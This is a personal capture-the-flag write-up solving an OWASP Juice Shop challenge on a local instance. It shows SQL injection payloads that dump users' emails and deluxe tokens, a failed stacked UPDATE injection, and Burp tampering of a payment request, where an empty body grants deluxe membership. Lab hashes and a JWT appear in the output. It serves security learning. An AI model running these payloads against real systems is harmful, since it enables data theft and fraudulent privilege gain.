- Look at the `Users` schema I obtained back in [[password-strength]]
- See there is a field named `deluxeToken` in the `Users` table
- I intended to steal someone's else's `deluxeToken` by updating the db through SQL injection.
- Check if anyone has deluxe membership with SQL injection just like I did with [[password-strength]] `')) UNION SELECT 1, 2, email, deluxeToken, 5, 6, 7, 8, 9 FROM Users WHERE deluxeToken IS NOT NULL AND deluxeToken <> ''--`
- I see people with `deluxeToken` (deluxe membership)
```
{"id":1,"name":"2","description":"bjoern@owasp.org","price":"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4","deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"2","description":"ciso@juice-sh.op","price":"d715c2c75d4a42d3825a050e0a0163c1959b51165373f17bd8eed7b1e05bf20d","deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"2","description":"ethereum@juice-sh.op","price":"b49b30b294d8c76f5a34fc243b9b9cccb057b3f675b07a5782276a547957f8ff","deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"2","description":"jim@juice-sh.op","price":"11e59df214a82d9b4eb47bf3cb60873ca66b54832ffaf05b6fe77c5868573643","deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"2","description":"stan@juice-sh.op","price":"8f70e0f4b05685efff1ab979e8f5d7e39850369309bb206c2ad3f7d51a1f4e39","deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},
```
- Set my `deluxeToken` to one of the tokens above with ``
`')); UPDATE Users SET deluxeToken='efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4' WHERE email='test@gmail.com';--`
- See that it respond with normal search results
- Tested again if I gain deluxe membership - nothing happens
- Test if the db actually has the `deluxeToken` for `test@gmail.com` with `')) UNION SELECT 1, 2, email, deluxeToken, 5, 6, 7, 8, 9 FROM Users WHERE email='test@gmail.com'--`
- See nothing `{"id":1,"name":"2","description":"test@gmail.com","price":"","deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},`
- Let's see if the db even attempt my UPDATE at all with `')); UPDATE Userzzz SET deluxeToken='x' WHERE email='test@gmail.com';--`
- Also see a normal request
- Confirm that it silently stopped after the first statement (the SELECT) and just ignored everything after the `;`, which is actually a very common real-world limitation — a lot of database drivers/ORMs (including ones commonly used with Node.js + SQLite) execute only the first statement in a string and ignore the rest, precisely _as a security measure_ against exactly this kind of attack.
- **I should have tested to see if I can WRITE with SQL injection first!** 
- Let's try another approach.
- I want to see what requests are made when I legitimately buying deluxe membership first. 
- Sign into Jim's account (which I already did in [[login-jim]])
- Go to http://localhost:3000/#/deluxe-membership 
- Use his card to buy membership
- See 
```
POST /rest/deluxe-membership HTTP/1.1
[...]
{"paymentMode":"card","paymentId":5}
```
- Now, sign in to my account `test@gmail.com`
- Fill all details into the payment page
- Turn burp intercept on
- Click `Continue`
- Edit the `paymentId` to `1`. See
```
HTTP/1.1 400 Bad Request
[...]
{"status":"error","error":"Invalid Card"}
```
- Edit the `paymentMode` to `wallet`. See
```
{"status":"error","error":"Insuffienct funds in Wallet"}
```
- Try without content `{}`
- Succeed! See:
```
"status":"success","data":{"confirmation":"Congratulations! You are now a deluxe member!","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjYsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0QG1haWwuY29tIiwicGFzc3dvcmQiOiI3MzBiMzA0NTY5MWQ3NTQ0MWU1YTY3MDRjN2JhNmNhOCIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6ImIwMzYxMDIwMDkzYTcxY2QxNTg1NzZhNDU2N2UwZWVkOTViMjNiYmM1MTc5Nzg2ODQ3OTg0NWU2NWEyOWQwOGQiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNy0wOVQxNDowNzowNi43NDVaIiwidXBkYXRlZEF0IjoiMjAyNi0wNy0wOVQxNDoxNTowNC44ODBaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgzNjA2NTA1fQ.n77-jnOYqMuZudkEG-pAVoDkpV6umGuhVXO8V_Uhpg28EB4lBDQ5qR4vHvxcZNI8OKlSUsTYdqafW-owrNFm-JJhwmnqot19uPM9cjKlQ9izTdr5YYqg9IO-iTkGRzXHgHANH-fAwANUj-ng7iPqvvbltRAn-4PrrWntIi3n8DU"}}
```
- This confirm the suspicion that "if paymentMode is card, check the card; if paymentMode is wallet, check the balance". It fails to handle what happens if `paymentMode` is neither (no catch all `else`) and default to granting privilege.
- Also, just for curiosity purpose. The token I got earlier (eyJ...header...eyJ...payload....n77-...signature) can be translated to:
```
{"typ":"JWT","alg":"RS256"}.{"status":"success","data":{"id":26,"username":"","email":"test@mail.com","password":"730b3045691d75441e5a6704c7ba6ca8","role":"deluxe","deluxeToken":"b0361020093a71cd158576a4567e0eed95b23bbc51797868479845e65a29d08d","lastLoginIp":"0.0.0.0","profileImage":"/assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2026-07-09T14:07:06.745Z","updatedAt":"2026-07-09T14:15:04.880Z","deletedAt":null},"iat":1783606505}.[signature]
```